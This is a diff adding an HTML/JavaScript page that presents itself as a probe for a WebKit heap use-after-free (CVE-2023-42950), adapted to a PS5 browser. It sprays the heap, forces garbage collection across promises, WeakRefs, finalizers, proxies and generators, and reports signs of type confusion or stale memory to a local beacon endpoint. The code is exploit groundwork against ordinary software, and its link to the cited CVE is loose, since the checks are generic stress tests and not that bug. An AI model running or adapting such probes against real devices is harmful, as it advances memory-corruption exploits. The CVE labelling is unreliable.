@@ -1,0 +1,301 @@
+<!--
+  p694: CVE-2023-42950 -- WebKit heap UAF (Nan Wang / 360 VRI)
+  Adapted for PS5 guide-entry beacon API (POST /api/beacon)
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p694</title></head>
+<body><pre id="out">p694: CVE-2023-42950 heap UAF (Nan Wang / 360 VRI)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var _sid='p694-'+Date.now();
+function say(s){O.textContent+='\n'+s;}
+function b(m){
+  var msg='P694-'+m;
+  say(msg);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/api/beacon',false);
+    x.setRequestHeader('Content-Type','application/json');
+    x.send(JSON.stringify({stage:'p694',msg:msg,level:'info',sid:_sid,ua:navigator.userAgent}));
+  }catch(e){
+    try{new Image().src='/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now();}catch(e2){}
+  }
+}
+
+function main(){
+  b('START:CVE-2023-42950-HEAP-UAF');
+  var results = [];
+
+  // === SECTION A: Promise reaction with freed scope ===
+  b('A:PROMISE-SCOPE');
+  try {
+    var leaked = [];
+
+    function createLeakyPromise() {
+      var bigData = new ArrayBuffer(16384);
+      var view = new Uint8Array(bigData);
+      for (var i = 0; i < view.length; i++) view[i] = 0xBB;
+
+      return new Promise(function(resolve) {
+        setTimeout(function() {
+          resolve(bigData);
+        }, 10);
+      }).then(function(data) {
+        leaked.push(data.byteLength);
+        return data;
+      });
+    }
+
+    var promises = [];
+    for (var i = 0; i < 100; i++) {
+      promises.push(createLeakyPromise());
+    }
+
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(4096);
+
+    Promise.all(promises).then(function(results_arr) {
+      b('A:ALL-RESOLVED:count=' + results_arr.length);
+      var valid = 0;
+      for (var i = 0; i < results_arr.length; i++) {
+        if (results_arr[i] && results_arr[i].byteLength === 16384) valid++;
+      }
+      b('A:VALID-BUFFERS:' + valid + '/100');
+      if (valid < 100) {
+        b('A:MISSING-BUFFERS');
+        results.push('A:missing');
+      }
+      runSectionB();
+    }).catch(function(e) {
+      b('A:PROMISE-ERR:' + e.message);
+      runSectionB();
+    });
+  } catch(e) {
+    b('A:ERR:' + e.message);
+    runSectionB();
+  }
+
+  function runSectionB() {
+    b('B:WEAKREF');
+    try {
+      if (typeof WeakRef !== 'undefined') {
+        var refs = [];
+
+        for (var i = 0; i < 100; i++) {
+          var obj = { id: i, data: new ArrayBuffer(1024) };
+          refs.push(new WeakRef(obj));
+        }
+
+        for (var g = 0; g < 10; g++) {
+          for (var i = 0; i < 5000; i++) new ArrayBuffer(2048);
+        }
+
+        var spray = [];
+        for (var i = 0; i < 4096; i++) {
+          spray.push({ id: 'spray-' + i, fake: new ArrayBuffer(1024) });
+        }
+
+        var alive = 0;
+        var dead = 0;
+        var weird = 0;
+        for (var i = 0; i < refs.length; i++) {
+          var val = refs[i].deref();
+          if (val === undefined) {
+            dead++;
+          } else if (val.id === i) {
+            alive++;
+          } else {
+            weird++;
+            b('B:WEIRD-DEREF:expected=' + i + ',got=' + JSON.stringify(val).substring(0, 50));
+            results.push('B:type-confusion');
+          }
+        }
+        b('B:ALIVE=' + alive + ',DEAD=' + dead + ',WEIRD=' + weird);
+      } else {
+        b('B:NO-WEAKREF');
+      }
+      runSectionC();
+    } catch(e) {
+      b('B:ERR:' + e.message);
+      runSectionC();
+    }
+  }
+
+  function runSectionC() {
+    b('C:FINALIZATION');
+    try {
+      if (typeof FinalizationRegistry !== 'undefined') {
+        var callbacks = [];
+        var fr = new FinalizationRegistry(function(heldValue) {
+          callbacks.push(heldValue);
+          b('C:FINALIZED:' + heldValue);
+
+          if (typeof heldValue === 'object' && heldValue !== null) {
+            try {
+              b('C:HELD-KEYS:' + Object.keys(heldValue).join(','));
+            } catch(e2) {
+              b('C:HELD-ERR:' + e2.message);
+              results.push('C:stale-held');
+            }
+          }
+        });
+
+        for (var i = 0; i < 50; i++) {
+          var obj = { idx: i };
+          var held = { ref: i, data: new Array(100).fill(i) };
+          fr.register(obj, held);
+        }
+
+        for (var g = 0; g < 20; g++) {
+          for (var i = 0; i < 3000; i++) new ArrayBuffer(2048);
+        }
+
+        setTimeout(function() {
+          b('C:CALLBACKS-RECEIVED:' + callbacks.length);
+          runSectionD();
+        }, 500);
+      } else {
+        b('C:NO-FINALIZATIONREGISTRY');
+        runSectionD();
+      }
+    } catch(e) {
+      b('C:ERR:' + e.message);
+      runSectionD();
+    }
+  }
+
+  function runSectionD() {
+    b('D:PROXY-HANDLER-FREE');
+    try {
+      var handlerCallCount = 0;
+
+      var handler = {
+        get: function(target, prop) {
+          handlerCallCount++;
+          if (handlerCallCount === 50) {
+            handler = null;
+            for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+          }
+          return target[prop];
+        },
+        set: function(target, prop, value) {
+          handlerCallCount++;
+          if (handlerCallCount >= 100) {
+            for (var i = 0; i < 2000; i++) new ArrayBuffer(1024);
+          }
+          target[prop] = value;
+          return true;
+        }
+      };
+
+      var proxy = new Proxy({}, handler);
+
+      try {
+        for (var i = 0; i < 200; i++) {
+          proxy['key' + i] = i;
+          var v = proxy['key' + i];
+          if (v !== i) {
+            b('D:WRONG-VALUE:key=' + i + ',got=' + v);
+            results.push('D:wrong-value');
+            break;
+          }
+        }
+        b('D:PROXY-CALLS:' + handlerCallCount);
+      } catch(e2) {
+        b('D:PROXY-ERR:' + e2.message);
+      }
+      runSectionE();
+    } catch(e) {
+      b('D:ERR:' + e.message);
+      runSectionE();
+    }
+  }
+
+  function runSectionE() {
+    b('E:GENERATOR-SCOPE');
+    try {
+      function* leakyGenerator() {
+        var bigArr = new Array(10000).fill(42);
+        yield bigArr.length;
+
+        for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+
+        yield bigArr[0];
+
+        bigArr[5000] = 99;
+        yield bigArr[5000];
+      }
+
+      var gen = leakyGenerator();
+
+      var v1 = gen.next();
+      b('E:YIELD-1:' + v1.value);
+
+      for (var i = 0; i < 10000; i++) new ArrayBuffer(2048);
+      var spray5 = [];
+      for (var i = 0; i < 4096; i++) spray5.push(new ArrayBuffer(80));
+
+      var v2 = gen.next();
+      b('E:YIELD-2:' + v2.value);
+      if (v2.value !== 42) {
+        b('E:SCOPE-CORRUPTED:expected=42,got=' + v2.value);
+        results.push('E:scope-corruption');
+      }
+
+      spray5 = null;
+      for (var i = 0; i < 10000; i++) new ArrayBuffer(2048);
+
+      var v3 = gen.next();
+      b('E:YIELD-3:' + v3.value);
+      if (v3.value !== 99) {
+        b('E:SCOPE-CORRUPTED-2:expected=99,got=' + v3.value);
+        results.push('E:scope-corruption-2');
+      }
+
+      gen.return();
+
+      async function* asyncGen() {
+        var data = new ArrayBuffer(8192);
+        var view = new Uint8Array(data);
+        view[0] = 0xAA;
+        yield view[0];
+        await new Promise(function(r) { setTimeout(r, 50); });
+        yield view[0];
+      }
+
+      var ag = asyncGen();
+      ag.next().then(function(r1) {
+        b('E:ASYNC-1:' + r1.value);
+        for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+        return ag.next();
+      }).then(function(r2) {
+        b('E:ASYNC-2:' + r2.value);
+        if (r2.value !== 0xAA) {
+          b('E:ASYNC-CORRUPTED');
+          results.push('E:async-corruption');
+        }
+        finish();
+      }).catch(function(e) {
+        b('E:ASYNC-ERR:' + e.message);
+        finish();
+      });
+    } catch(e) {
+      b('E:ERR:' + e.message);
+      finish();
+    }
+  }
+
+  function finish() {
+    if (results.length > 0) {
+      b('RESULT:HITS=' + results.join(';'));
+    } else {
+      b('RESULT:NO-UAF-DETECTED');
+    }
+    b('DONE');
+  }
+}
+
+setTimeout(main, 200);
+</script></body></html>
